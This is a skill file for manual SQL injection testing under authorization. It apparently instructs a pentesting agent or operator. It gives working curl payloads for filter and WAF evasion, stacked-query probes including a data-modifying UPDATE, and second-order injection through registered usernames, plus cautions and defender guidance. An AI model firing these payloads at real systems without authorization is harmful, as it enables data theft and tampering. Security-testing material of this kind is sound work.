---
name: sqli-manual-fallback
description: Use when sqlmap or scanners fail against a SQL injection point
  and you must work by hand on an authorized test. Covers hand-built tamper
  equivalents, filter evasion with encoding and comments, stacked queries,
  second-order manual testing, and knowing when to stop. Use when automation
  reports not injectable but manual probes differ, when a WAF blocks tooling
  signatures, when the injection needs multi-request logic, or when you must
  prove a finding the scanner missed.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
parent: web-sqli
requires: [web-sqli]
extends: []
relates: [web-xss]
tools:
  - name: curl
    version: 8.5
  - name: Burp Suite
    version: 2026.2
  - name: Python
    version: 3.12
---

Manual fallback is the operator skill underneath the tooling: crafting
payloads by hand when sqlmap cannot confirm or exploit an injection. This
skill covers hand-built filter evasion, stacked queries, second-order
testing, and the judgment to stop when a point is genuinely not exploitable.
Use it on authorized tests when automation fails, not as a first resort;
manual work is slower and noisier per finding, but it catches what
signatures miss.

## Quick Workflow

1. Reproduce the exact manual probe that automation could not, in Burp
   Repeater, and save it.
2. Identify what blocks automation: keyword filter, WAF signature, encoding
   issue, or session handling.
3. Build minimal bypass payloads by hand, changing one thing at a time.
4. Confirm the bypass with the smallest observable difference, then expand
   to extraction.
5. Extract with hand-built UNION or blind payloads, keeping request counts
   low.
6. Document the bypass technique and the exact failing automation command
   for the report.

## 1. Hand-built filter evasion

Change one thing per request so you learn which transformation defeats the
filter.

```bash
# Case variation defeats naive keyword blacklists
curl -s "https://target.example/item?id=-5%20UnIoN%20SeLeCt%201,2,3--%20-"

# Inline comments break keyword signatures (MySQL)
curl -s "https://target.example/item?id=-5%20UN/**/ION%20SEL/**/ECT%201,2,3--%20-"

# Tab and newline as whitespace when spaces are stripped
curl -s "https://target.example/item?id=-5%09UNION%09SELECT%091,2,3--%20-"

# BETWEEN instead of = when the equals sign is filtered
curl -s "https://target.example/item?id=5%20AND%201%20BETWEEN%201%20AND%201--%20-"

# CHAR() construction avoids quoted strings entirely (MSSQL)
# ... WHERE name = CHAR(97,100,109,105,110)  -- spells 'admin'
```

Test each variant against a control (`AND 1=1` versus `AND 1=2`) so you know
the variant executes rather than just not erroring.

## 2. Stacked queries by hand

When the driver allows multiple statements, the second statement is yours.

```bash
# MSSQL stacked probe: delay only if stacking works
time curl -s "https://target.example/item?id=5%3BWAITFOR%20DELAY%20'0:0:3'--%20-" -o /dev/null

# PostgreSQL stacked probe
time curl -s "https://target.example/item?id=5%3BSELECT%20pg_sleep(3)--%20-" -o /dev/null

# Stacked update as impact proof (only with explicit permission, on a
# non-production target, and reverted immediately)
# id=5;UPDATE users SET bio='probe' WHERE username='testuser'-- -
```

Stacked queries are the highest-risk manual technique because they can
modify data. Treat any stacked write as requiring the same approval as
`--os-shell` in sqlmap, and revert test changes before you leave.

## 3. Second-order manual testing

Store the payload with one request, trigger it with another.

```bash
# Step 1: register a username containing a boolean probe
curl -s -X POST 'https://target.example/register' \
  -d "user=test' AND '1'='1&pass=Password1!" -o /tmp/reg.html

# Step 2: visit every page that renders the username
for page in profile admin/users orders/history; do
  echo "== $page =="
  curl -s "https://target.example/$page" -b /tmp/cookies.txt \
    | grep -i -E 'sql|syntax|error' | head -3
done

# Step 3: boolean second-order, compare two registrations
curl -s -X POST 'https://target.example/register' \
  -d "user=probe_true' AND '1'='1&pass=Password1!"
curl -s -X POST 'https://target.example/register' \
  -d "user=probe_false' AND '1'='2&pass=Password1!"
# Log in as each and diff a page that lists the username
```

Second-order payloads often execute far from the injection point (admin
panels, exports, reports), so widen the crawl beyond the obvious pages.

## Edge cases

- The bypass works once, then stops. The WAF learned the pattern or the
  session was flagged; rotate the technique, not just the payload.
- Manual payloads get mangled by double URL encoding. Send through Burp
  Repeater where you control the exact bytes, and compare with what curl
  sends via `--trace-ascii`.
- The application normalizes input (lowercases, strips comments) before the
  query. Test normalization with a canary string and adapt the payload to
  survive it.
- You cannot tell whether the filter or the query broke. Build a truth
  table: run each payload with `1=1` and `1=2` variants and record which
  pairs differ.

## Escalation

- Every bypass is blocked: the filter may be a positive allow-list (only
  digits accepted). Confirm with non-SQL metacharacters; if the app truly
  allow-lists, the point is not injectable and you move on.
- You suspect a filter bypass exists but cannot find it: time-box the
  effort (for example one hour), then record the unexploited suspicion with
  the evidence and move to the next target.
- Manual extraction is too slow: once you have one working bypass primitive,
  feed the exact working request to sqlmap with `--tamper` disabled and a
  custom prefix or suffix via `--prefix` and `--suffix`.
- The finding needs exploit code for the report: write the minimal stdlib
  Python proof of concept, no bigger than needed to reproduce.

## Detection and defender view

Defenders see manual testing as slower, more varied probing than tool
bursts: irregular timing, creative encodings, and payloads that mutate
between requests. It is harder to signature than sqlmap but still shows up
as anomalous input in logs. The defense does not change: parameterized
queries, positive input validation, and logging with alerting on database
errors. Manual skill is exactly why allow-list validation beats
block-list filtering.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- CWE-89 (Improper Neutralization of Special Elements used in an SQL
  Command, SQL Injection).
- CWE-20 (Improper Input Validation).
- OWASP Testing Guide: Testing for SQL Injection (OTG-INPVAL-005).
- PortSwigger Web Security Academy: SQL injection filter bypass labs.
